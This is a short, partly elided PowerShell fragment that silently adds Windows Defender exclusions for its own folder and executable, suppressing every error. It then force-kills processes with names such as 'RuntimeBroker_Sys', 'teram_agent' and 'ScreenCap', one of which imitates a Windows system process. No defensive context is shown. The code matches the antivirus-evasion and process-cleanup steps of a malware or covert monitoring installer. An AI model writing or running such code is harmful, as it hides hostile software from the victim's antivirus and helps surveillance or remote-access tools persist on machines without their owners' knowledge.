...
try { Add-MpPreference -ExclusionPath $PSScriptRoot -ErrorAction SilentlyContinue } catch {}
try { Add-MpPreference -ExclusionProcess $ExeName -ErrorAction SilentlyContinue } catch {}
...
@("RuntimeBroker_Sys", "teram_agent", "ScreenCap", "wscript") | ForEach-Object {
    ...
    cmd.exe /c "taskkill /F /IM `"$_.exe`" /T 2>nul" | Out-Null
}
